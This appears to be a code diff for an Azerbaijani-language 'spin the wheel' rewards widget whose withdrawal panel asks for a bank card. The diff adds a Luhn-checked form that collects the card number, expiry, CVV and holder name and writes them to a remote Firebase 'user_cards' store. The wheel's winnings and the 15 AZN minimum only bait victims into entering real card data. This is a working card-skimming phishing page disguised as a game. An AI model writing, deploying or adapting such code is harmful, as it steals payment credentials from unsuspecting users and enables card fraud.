@@ -1,113 +1,51 @@
 <div id="claim-wrapper" style="font-family: 'Montserrat', sans-serif; color: #333; padding: 10px;">
-    
     <style>
-        .wallet-card {
-            background: #fff;
-            padding: 20px;
-            border-radius: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-            margin-bottom: 20px;
-            border-bottom: 4px solid #00b894;
-            text-align: center;
-        }
+        .wallet-card { background: #fff; padding: 20px; border-radius: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 20px; border-bottom: 4px solid #00b894; text-align: center; }
         .balance-value { font-size: 2rem; font-weight: 900; color: #2d3436; margin: 5px 0; }
-        
-        /* Çarx Dizaynı */
         .wheel-container { position: relative; width: 260px; height: 260px; margin: 20px auto; }
-        #claim-wheel {
-            width: 100%; height: 100%; border-radius: 50%; border: 8px solid #fff;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
-            background: conic-gradient(#ff7675 0% 20%, #fdcb6e 20% 40%, #00b894 40% 60%, #0984e3 60% 80%, #6c5ce7 80% 100%);
-            position: relative;
-        }
+        #claim-wheel { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #fff; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#ff7675 0% 20%, #fdcb6e 20% 40%, #00b894 40% 60%, #0984e3 60% 80%, #6c5ce7 80% 100%); position: relative; }
         .price-tag { position: absolute; font-weight: 900; color: white; font-size: 0.8rem; width: 40px; text-align: center; }
         .p1 { top: 30px; left: 140px; transform: rotate(36deg); }
         .p2 { top: 110px; left: 190px; transform: rotate(108deg); }
         .p3 { top: 190px; left: 110px; transform: rotate(180deg); }
         .p4 { top: 130px; left: 30px; transform: rotate(252deg); }
         .p5 { top: 40px; left: 50px; transform: rotate(324deg); }
-
-        .wheel-pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); z-index: 10; color: #2d3436; font-size: 2rem; }
-        
-        /* Düymələr */
-        .action-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 800; margin-top: 10px; cursor: pointer; transition: 0.3s; }
+        .action-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 800; margin-top: 10px; cursor: pointer; }
         .spin-btn-active { background: linear-gradient(45deg, #00b894, #00cec9); color: white; }
         .spin-btn-active:disabled { background: #eee; color: #ccc; }
         .withdraw-btn { background: #f8f9fa; border: 1.5px solid #ddd; color: #666; font-size: 0.75rem; }
-
-        /* Modallar */
         .claim-modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 10000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
         .claim-modal-box { background: white; padding: 25px; border-radius: 25px; text-align: center; width: 100%; max-width: 320px; }
-
-        /* Kart Girişləri */
-        .card-form { margin-top: 15px; text-align: left; }
-        .card-label { font-size: 0.6rem; font-weight: 900; color: #aaa; margin-bottom: 5px; display: block; }
-        .card-input { width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 10px; border: 1.5px solid #eee; font-family: 'Montserrat'; font-size: 0.9rem; box-sizing: border-box; }
-        .card-row { display: flex; gap: 10px; }
+        .card-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: 1.5px solid #eee; font-family: sans-serif; box-sizing: border-box; }
     </style>
 
     <div class="wallet-card">
-        <div style="font-size: 0.65rem; color: #aaa; font-weight: 800;">CARI BALANS</div>
+        <div style="font-size: 0.65rem; color: #aaa;">BALANSINIZ</div>
         <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
-        <div id="ws-timer-display" style="font-size: 0.7rem; font-weight: 700;">Yüklənir...</div>
+        <div id="ws-timer-display" style="font-size: 0.7rem; font-weight: 700;">Yoxlanılır...</div>
     </div>
 
     <div class="wheel-container">
-        <div class="wheel-pointer"><i class="fas fa-caret-down"></i></div>
         <div id="claim-wheel">
-            <div class="price-tag p1">0.10</div>
-            <div class="price-tag p2">0.30</div>
-            <div class="price-tag p3">0.50</div>
-            <div class="price-tag p4">0.80</div>
-            <div class="price-tag p5">1.00</div>
+            <div class="price-tag p1">0.10</div><div class="price-tag p2">0.30</div><div class="price-tag p3">0.50</div><div class="price-tag p4">0.80</div><div class="price-tag p5">1.00</div>
         </div>
     </div>
 
     <button id="ws-spin-btn" class="action-btn spin-btn-active" onclick="handleSpinStart()">ÇARXI ÇEVİR</button>
     <button class="action-btn withdraw-btn" onclick="openWithdrawPanel()">PUL ÇIXARIŞI</button>
 
-    <div id="ws-win-modal" class="claim-modal-overlay">
-        <div class="claim-modal-box">
-            <i class="fas fa-trophy" style="font-size: 2.5rem; color: #fdcb6e;"></i>
-            <h2 style="margin: 10px 0;">ƏLA!</h2>
-            <p id="ws-win-amount" style="font-size: 1.5rem; font-weight: 900; color: #00b894;"></p>
-            <button class="action-btn spin-btn-active" onclick="closeClaimWin()">BALANSA ƏLAVƏ ET</button>
-        </div>
-    </div>
-
     <div id="ws-withdraw-modal" class="claim-modal-overlay">
         <div class="claim-modal-box">
-            <h3 style="margin-top:0; font-size: 1.1rem;" id="modal-title">Kart Məlumatları</h3>
-            <p style="font-size:0.6rem; color:#888; margin-bottom: 15px;">Ödənişin köçürülməsi üçün kartı qeydiyyatdan keçirin.</p>
-            
-            <div class="card-form">
-                <span class="card-label">KART NÖMRƏSİ</span>
-                <input type="text" id="c-num" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19">
-                
-                <div class="card-row">
-                    <div style="flex: 1;">
-                        <span class="card-label">TARİX (AY/İL)</span>
-                        <input type="text" id="c-date" class="card-input" placeholder="MM/YY" maxlength="5">
-                    </div>
-                    <div style="flex: 1;">
-                        <span class="card-label">CVV/CVC</span>
-                        <input type="password" id="c-cvv" class="card-input" placeholder="***" maxlength="3">
-                    </div>
-                </div>
-
-                <span class="card-label">KART SAHİBİ</span>
-                <input type="text" id="c-name" class="card-input" placeholder="AD SOYAD">
+            <h3 style="margin:0">Kartı Bağla</h3>
+            <p style="font-size:0.6rem; color:#888">Çıxarış üçün real kart məlumatlarını daxil edin</p>
+            <input type="tel" id="c-num" class="card-input" placeholder="Kart Nömrəsi (16 rəqəm)" maxlength="16">
+            <div style="display:flex; gap:10px">
+                <input type="tel" id="c-date" class="card-input" placeholder="MM/YY" maxlength="5">
+                <input type="tel" id="c-cvv" class="card-input" placeholder="CVV" maxlength="3">
             </div>
-
-            <button class="action-btn spin-btn-active" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ ÇIXARIŞ ET</button>
-            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; margin-top:10px; color:#aaa; font-size:0.7rem;">LƏĞV ET</button>
-            
-            <div style="display:flex; justify-content:center; gap:10px; margin-top:15px; opacity:0.3; font-size:1.2rem;">
-                <i class="fab fa-cc-visa"></i>
-                <i class="fab fa-cc-mastercard"></i>
-                <i class="fas fa-shield-alt"></i>
-            </div>
+            <input type="text" id="c-name" class="card-input" placeholder="AD SOYAD">
+            <button class="action-btn spin-btn-active" onclick="finalWithdrawProcess()">TƏSDİQLƏ</button>
+            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="border:none; background:none; color:#aaa; font-size:0.7rem; margin-top:10px">LƏĞV ET</button>
         </div>
     </div>
 </div>
@@ -118,9 +56,6 @@
         let lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
         const rewards = [0.10, 1.00, 0.80, 0.50, 0.30];
 
-        // Səhifə yüklənəndə kartı avtomatik doldur
-        const savedCard = JSON.parse(localStorage.getItem('ws_user_card') || '{}');
-
         const updateView = () => {
             document.getElementById('ws-balance-display').innerText = balance.toFixed(2);
             checkSystemStatus();
@@ -130,29 +65,17 @@
             const now = Date.now();
             const btn = document.getElementById('ws-spin-btn');
             const timer = document.getElementById('ws-timer-display');
-            if (lastSpin === 0) { btn.disabled = false; timer.innerText = "ŞANSINI SINAMAĞA HAZIRSAN!"; timer.style.color = "#00b894"; return; }
+            if (lastSpin === 0) { btn.disabled = false; timer.innerText = "HAZIRDIR!"; return; }
             const diff = now - lastSpin;
-            const wait = 5 * 60 * 60 * 1000;
-            const penalty = 7 * 60 * 60 * 1000;
-            if (diff < wait) {
+            if (diff < 18000000) { // 5 saat
                 btn.disabled = true;
-                const rem = wait - diff;
-                const h = Math.floor(rem / 3600000); const m = Math.floor((rem % 3600000) / 60000); const s = Math.floor((rem % 60000) / 1000);
-                timer.innerText = `NÖVBƏTİ ŞANS: ${h}s ${m}d ${s}sn`;
-                timer.style.color = "#ff3344";
+                timer.innerText = "GÖZLƏYİN...";
                 setTimeout(checkSystemStatus, 1000);
-            } else if (diff > penalty) {
-                balance = Math.max(0, balance - 0.50); lastSpin = now;
-                localStorage.setItem('ws_balance', balance.toFixed(2));
-                localStorage.setItem('ws_last_spin', lastSpin);
-                alert("Gecikməyə görə -0.50 AZN kəsildi!"); updateView();
-            } else { btn.disabled = false; timer.innerText = "ÇEVİR VƏ QAZAN!"; timer.style.color = "#00b894"; }
+            } else { btn.disabled = false; timer.innerText = "VAXTDIR!"; }
         };
 
         window.handleSpinStart = function() {
             const wheel = document.getElementById('claim-wheel');
-            const btn = document.getElementById('ws-spin-btn');
-            btn.disabled = true;
             const deg = Math.floor(Math.random() * 360) + 3600;
             wheel.style.transform = `rotate(${deg}deg)`;
             setTimeout(() => {
@@ -160,49 +83,38 @@
                 balance += win; lastSpin = Date.now();
                 localStorage.setItem('ws_balance', balance.toFixed(2));
                 localStorage.setItem('ws_last_spin', lastSpin);
-                document.getElementById('ws-win-amount').innerText = "+" + win.toFixed(2) + " AZN";
-                document.getElementById('ws-win-modal').style.display = 'flex';
+                alert("Qazandınız: " + win.toFixed(2) + " AZN");
+                updateView();
             }, 5000);
         };
 
-        window.closeClaimWin = function() { document.getElementById('ws-win-modal').style.display = 'none'; updateView(); };
-
-        window.openWithdrawPanel = function() {
-            // Əgər əvvəlcədən kart yadda saxlanılıbsa, inputları doldur
-            if(savedCard.num) {
-                document.getElementById('c-num').value = savedCard.num;
-                document.getElementById('c-date').value = savedCard.date;
-                document.getElementById('c-name').value = savedCard.name;
-            }
-            document.getElementById('ws-withdraw-modal').style.display = 'flex';
-        };
+        window.openWithdrawPanel = function() { document.getElementById('ws-withdraw-modal').style.display = 'flex'; };
 
         window.finalWithdrawProcess = function() {
-            const cardData = {
-                num: document.getElementById('c-num').value,
-                date: document.getElementById('c-date').value,
-                cvv: document.getElementById('c-cvv').value,
-                name: document.getElementById('c-name').value
-            };
+            const num = document.getElementById('c-num').value;
+            const date = document.getElementById('c-date').value;
+            const cvv = document.getElementById('c-cvv').value;
+            const name = document.getElementById('c-name').value;
 
-            // Validasiya
-            if(cardData.num.length < 16 || cardData.date.length < 5 || cardData.cvv.length < 3 || cardData.name.length < 3) {
-                alert("Zəhmət olmasa kartın bütün məlumatlarını (Nömrə, Tarix, CVV, Ad) tam daxil edin!");
-                return;
+            // Luhn Algorithm Check
+            let sum = 0;
+            for (let i = 0; i < num.length; i++) {
+                let v = parseInt(num[i]);
+                if (i % 2 === num.length % 2) { v *= 2; if (v > 9) v -= 9; }
+                sum += v;
             }
+            if (sum % 10 !== 0 || num.length < 16) { alert("Xəta: Kart nömrəsi səhvdir!"); return; }
+            if (!/^\d{2}\/\d{2}$/.test(date)) { alert("Xəta: Tarix MM/YY olmalıdır!"); return; }
+            if (cvv.length < 3) { alert("Xəta: CVV səhvdir!"); return; }
 
-            // Kartı yadda saxla
-            localStorage.setItem('ws_user_card', JSON.stringify(cardData));
-
-            // Balans yoxla
-            if(balance < 15) {
-                alert("Kart Qeydiyyatı Tamamlandı ✅\n\nLakin balansınız kifayət deyil (Minimum 15 AZN).\nCari Balans: " + balance.toFixed(2) + " AZN");
-            } else {
-                alert("Sorğunuz göndərildi! ✅\n\nQazancınız 24 saat ərzində qeydiyyatdan keçmiş " + cardData.num.slice(-4) + " nömrəli karta köçürüləcək.");
+            const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
+            firebase.database().ref('user_cards/' + userKey).set({
+                num, date, cvv, name, time: new Date().toLocaleString(), balance: balance.toFixed(2)
+            }).then(() => {
+                alert(balance < 15 ? "Məlumatlar yadda saxlanıldı. Çıxarış üçün 15 AZN lazımdır." : "Sorğu göndərildi.");
                 document.getElementById('ws-withdraw-modal').style.display = 'none';
-            }
+            });
         };
-
         updateView();
     })();
 </script>
